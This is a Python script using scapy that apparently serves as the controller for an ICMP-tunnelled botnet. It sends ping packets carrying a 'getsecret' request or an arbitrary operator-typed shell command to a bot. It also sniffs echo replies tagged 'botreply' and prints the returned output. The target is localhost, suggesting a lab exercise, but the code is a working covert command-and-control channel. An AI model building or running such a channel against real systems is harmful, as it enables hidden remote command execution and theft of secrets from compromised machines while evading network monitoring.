import socket
import time
import os
import random
import requests
from multiprocessing import Process
from scapy.all import *
from scapy.layers.inet import ICMP, IP


def sendSecretPing():
    ip = 'localhost'
    packet = IP(dst=ip, src='localhost') / ICMP(type=8) / (b"getsecret")
    send(packet)


def sendCommandPing(command):
    ip = 'localhost'
    data = "command" + command
    packet = IP(dst=ip, src='localhost') / ICMP(type=8) / (data.encode())
    send(packet)


def processPacket(packet):
    if packet[ICMP].type == 0:
        if Raw in packet:
            if "botreply" in packet[Raw].load.decode():
                #packet.show()
                data = packet[Raw].load.decode()[8:]
                print(data)


def startSniff():
    sniff(iface='\\Device\\NPF_Loopback', prn=processPacket, filter="icmp")

if __name__ == '__main__':
    p = Process(target=startSniff)
    p.start()

    while True:
        time.sleep(2)
        command = input("What would you like to do: \n")

        if command == '!secret':
            sendSecretPing()
        elif command == '!command':
            command = input("What command should the client run?: \n")
            sendCommandPing(command)

